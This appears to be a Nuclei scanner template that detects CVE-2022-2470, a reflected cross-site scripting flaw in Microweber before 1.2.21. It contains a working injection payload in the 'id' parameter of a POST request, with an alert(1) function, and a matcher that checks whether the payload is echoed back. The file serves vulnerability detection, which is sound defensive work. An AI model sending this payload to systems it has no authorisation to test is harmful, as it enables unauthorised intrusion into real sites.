id: CVE-2022-2470

info:
  name: Reflected XSS in Microweber prior to 1.2.21
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Cross-site Scripting (XSS) vulnerability in the 'id' parameter within a script tag in Microweber prior to version 1.2.21.
  remediation: |
    To mitigate this vulnerability, upgrade to Microweber version 1.2.21 or later. Always sanitize and validate input data on the server side to prevent XSS attacks.
  reference:
    - https://huntr.dev/bounties/3f1f679c-c243-431c-8ed0-e61543b9921b

http:
  - method: POST
    path:
      - "{{BaseURL}}/demo/module/"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
      Accept: "*/*"
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Origin: https://demo.microweber.org
      Referer: https://demo.microweber.org/demo/shop
      Sec-Fetch-Dest: document
      Sec-Fetch-Mode: navigate
      Sec-Fetch-Site: cross-site
      Connection: close

    body: |
      type=shop%2Fcheckout&template=modal&id=js-ajax-cart');});function%20$(num1){alert(1);return%20String(num1)}$(document).ready(function(){mw.$('-checkout-process&class=no-settings

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "js-ajax-cart');});function $(num1){alert(1);return String(num1)}$(document).ready(function(){mw.$('-checkout-process"
        part: body
